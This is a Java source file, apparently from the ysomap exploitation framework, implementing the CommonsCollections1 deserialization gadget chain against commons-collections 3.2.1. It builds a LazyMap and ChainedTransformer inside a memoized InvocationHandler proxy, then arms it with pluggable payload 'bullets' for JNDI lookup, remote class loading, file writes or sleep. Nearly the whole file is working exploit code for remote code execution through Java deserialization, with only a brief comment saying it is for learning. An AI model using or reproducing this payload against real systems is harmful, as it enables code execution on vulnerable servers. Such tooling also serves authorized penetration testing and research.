package ysomap.payloads.java.commons.collection_v3;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.LazyMap;
import ysomap.bullets.Bullet;
import ysomap.bullets.collections.TransformerBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/**
 * ysoserial 的 CommonsCollections3 也可以用这个
 * 仅供学习，实战不建议
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes","unchecked"})
//@Payloads
@Targets({Targets.JDK})
@Authors({ Authors.FROHOFF })
@Require(bullets = {"TransformerBullet",
        "TransformerWithJNDIBullet",
        "TransformerWithSleepBullet",
        "TransformerWithURLClassLoaderBullet",
        "TransformerWithFileWriteBullet"}, param = false)
@Dependencies({"commons-collections:commons-collections:3.2.1","jdk7"})
@Deprecated
public class CommonsCollections1 extends AbstractPayload<InvocationHandler> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof org.apache.commons.collections.Transformer[];
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return TransformerBullet.newInstance(args);
    }

    @Override
    public InvocationHandler pack(Object obj) throws Exception {
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        final Map mapProxy = PayloadHelper.createMemoitizedProxy(lazyMap, Map.class);

        final InvocationHandler handler = PayloadHelper.createMemoizedInvocationHandler(mapProxy);

        ReflectionHelper.setFieldValue(transformerChain, "iTransformers", obj); // arm with actual transformer chain

        return handler;
    }

}
